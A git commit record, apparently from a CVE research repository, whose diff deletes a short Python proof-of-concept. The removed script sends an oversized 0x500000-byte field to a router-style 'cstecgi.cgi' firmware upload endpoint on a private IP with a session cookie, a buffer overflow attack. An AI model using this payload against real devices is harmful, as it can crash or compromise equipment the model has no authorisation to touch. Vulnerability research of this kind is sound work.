760a6ffdd68371a84ef82f234406c85f86e50e6f
datnlq <datnguyenlequoc2001@gmail.com>
2025-07-30 11:29:43 +0700

    update CVE: cleanup scripts, add .gitignore

--- bof_uploadfirmware.py
+++
@@ -1,8 +0,0 @@
-import requests
-url = "http://192.168.210.133:8080/cgi-bin/cstecgi.cgi"
-cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
-data = {'topicurl' : "UploadFirmwareFile",
-"File" : "a"*0x500000}
-response = requests.post(url, cookies=cookie, json=data)
-print(response.text)
-print(response)
